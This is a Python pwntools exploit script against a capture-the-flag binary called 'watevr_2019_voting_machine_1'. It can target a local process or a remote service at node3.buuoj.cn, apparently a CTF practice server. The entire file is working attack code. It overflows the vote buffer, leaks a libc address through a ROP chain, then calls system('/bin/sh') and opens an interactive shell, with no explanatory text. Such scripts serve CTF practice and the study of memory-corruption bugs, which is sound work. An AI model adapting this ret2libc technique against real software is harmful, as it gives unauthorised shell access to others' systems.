import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./watevr_2019_voting_machine_1')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./watevr_2019_voting_machine_1')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',27292)
			elf=ELF('./watevr_2019_voting_machine_1')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		pop_rdi=0x00000000004009b3
		pay='a'*0xa+p64(pop_rdi)+p64(elf.got['gets'])+p64(elf.plt['puts'])+p64(0x400720)
		io.recvuntil('Vote: ')
		io.sendline(pay)
		io.recvuntil('Thanks for voting!\n')
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['gets']
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']
		pay='a'*0xa+p64(0x00000000004009b1)+p64(0)*2+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)
		#io.recvuntil('Vote: ')
		# gdb.attach(io)
		# pause()
		io.sendline(pay)
		io.recv()

		# success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue